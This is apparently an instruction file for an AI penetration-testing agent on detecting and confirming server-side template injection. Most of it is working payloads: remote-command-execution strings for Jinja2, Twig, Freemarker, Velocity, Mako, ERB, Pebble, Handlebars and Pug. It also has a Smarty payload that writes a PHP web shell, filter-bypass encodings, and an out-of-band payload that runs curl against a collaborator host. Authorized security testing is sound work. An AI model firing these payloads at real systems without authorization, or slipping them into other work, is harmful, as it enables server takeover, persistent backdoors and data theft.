# Server-Side Template Injection (SSTI) Detection Skill

## Objective
Identify Server-Side Template Injection vulnerabilities where user input is embedded into server-side templates.

## Instructions

### 1. Identify Potential Injection Points
Look for user input reflected in responses that might be template-rendered:
- Error messages with user input
- Email templates
- PDF generation
- Custom page builders
- CMS content areas
- URL parameters reflected in pages

### 2. Initial Detection
Test with polyglot payloads to identify template engines:

**Universal test payloads:**
```
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)
${{7*7}}
{{= 7*7}}
{{7*'7'}}
```

If you see `49` in the response, SSTI is likely present.

**Advanced polyglot:**
```
${{<%[%'"}}%\.
{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}*{7*7}@(7*7)
```

### 3. Template Engine Identification

**Jinja2 (Python):**
```
{{7*7}}  → 49
{{config}}  → Shows Flask config
{{self}}  → Shows template info
{{'a'.upper()}}  → A
```

**Twig (PHP):**
```
{{7*7}}  → 49
{{_self}}  → Twig object
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Freemarker (Java):**
```
${7*7}  → 49
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().getProtectionDomain().getCodeSource().getLocation()}
```

**Velocity (Java):**
```
#set($x=7*7)$x  → 49
#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())#set($proc=$rt.exec('id'))
```

**Smarty (PHP):**
```
{7*7}  → 49
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

**Mako (Python):**
```
${7*7}  → 49
<%import os%>${os.popen('id').read()}
```

**ERB (Ruby):**
```
<%= 7*7 %>  → 49
<%= system('id') %>
<%= `id` %>
```

**Pebble (Java):**
```
{{ 7*7 }}  → 49
{% set cmd = 'id' %}{{ [cmd]|map('system')|join }}
```

**Handlebars (JavaScript):**
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Jade/Pug (JavaScript):**
```
#{7*7}  → 49
- var x = root.process.mainModule.require('child_process').execSync('id')
```

### 4. Exploitation for Confirmation

**Jinja2 RCE:**
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}
```

**Twig RCE:**
```
{{['id']|filter('system')}}
{{['id']|map('passthru')}}
```

**Freemarker RCE:**
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id') }
```

### 5. Blind SSTI Detection
Use time-based or OOB techniques:

**Time-based:**
```
{{range.constructor("return this.constructor.constructor('return this.process.mainModule.require(`child_process`).execSync(`sleep 5`)')")()}}
```

**OOB with Collaborator:**
Use `collaborator_generate` then:
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/bin/bash -c "curl COLLABORATOR"').read() }}
```

### 6. Filter Bypass

**Jinja2 bypasses:**
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
{{request['__class__']['__mro__'][1]['__subclasses__']()}}
{% set a = "o]s" | replace("]","") %}{% print a %}
```

**Encoding:**
```
{{''['\x5f\x5fclass\x5f\x5f']}}  # __class__
{{config['\x5f\x5finit\x5f\x5f']}}  # __init__
```

### 7. Confirm and Document
If confirmed, create finding with:
- Vulnerable parameter
- Template engine identified
- Proof of concept payload
- Evidence (calculation result, command output)

## MCP Tools to Use
- `find_reflected`: Identify reflection points
- `http1_request`: Send test payloads
- `collaborator_generate` / `collaborator_poll`: OOB detection
- `repeater_tab_with_payload`: Manual testing
- `issue_create`: Report confirmed finding

## Keywords
template injection, server-side template injection

## References
- PayloadsAllTheThings/Server Side Template Injection
- PortSwigger SSTI Research
